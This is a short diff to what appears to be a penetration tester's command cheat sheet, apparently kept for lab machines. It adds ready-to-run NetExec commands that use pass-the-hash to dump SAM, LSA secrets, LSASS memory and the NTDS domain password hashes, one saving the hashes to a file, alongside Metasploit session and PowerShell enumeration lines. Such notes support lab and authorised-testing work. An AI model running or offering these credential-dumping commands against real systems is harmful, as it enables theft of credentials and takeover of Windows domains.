@@ -475,8 +475,10 @@ sessions
 sessions -i 1
 
 [*] Hash Dumping
-nxc smb 10.129.121.76 -u '$USERNAME' -H '$HASH' --sam --local-auth
-nxc smb 10.129.121.76 -u '$USERNAME' -H '$HASH' -M lsassy --local-auth
+nxc smb $TARGET -u '$USERNAME' -H '$HASH' --sam --local-auth
+nxc smb $TARGET -u '$USERNAME' -H '$HASH' --lsa --local-auth
+nxc smb $TARGET -u '$USERNAME' -H '$HASH' -M lsassy --local-auth
+nxc smb $TARGET -u '$USERNAME' -H '$HASH' --ntds | awk '{print $5}' | grep -vE '[+,-,*]' | sed 's/\x1b\[[0-9;]*m//g' | tee ntds_dump
 
 [*] Enumeration
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
